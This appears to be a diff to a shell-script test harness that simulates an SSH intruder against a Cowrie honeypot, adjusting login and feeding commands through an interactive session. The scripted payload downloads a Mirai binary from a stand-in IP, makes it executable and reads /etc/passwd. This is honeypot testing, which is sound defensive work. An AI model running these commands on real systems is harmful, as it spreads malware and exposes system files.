@@ -101,10 +101,21 @@ attack_commands() {
     return
   fi
 
-  sshpass -p root ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no \
+  # Cowrie's default userdb DENIES root:root but accepts root with any other
+  # password, and it only logs commands from an interactive shell — SSH "exec"
+  # requests (ssh host "cmd") are refused. So force a PTY (-tt) and feed the
+  # payload on stdin, one command per line, exactly as a real intruder would.
+  sshpass -p 's3cr3t' ssh -tt -p "$SSH_PORT" -o StrictHostKeyChecking=no \
     -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 root@"$HOST_IP" \
-    "uname -a; cat /proc/cpuinfo | head; wget http://203.0.113.99/mirai.arm; busybox; cat /etc/passwd" \
-    >/dev/null 2>&1
+    >/dev/null 2>&1 <<'CMDS'
+uname -a
+cat /proc/cpuinfo | head
+wget http://203.0.113.99/mirai.arm
+chmod +x mirai.arm
+busybox
+cat /etc/passwd
+exit
+CMDS
   ok "executed recon + malware-download commands in session"
 }
 
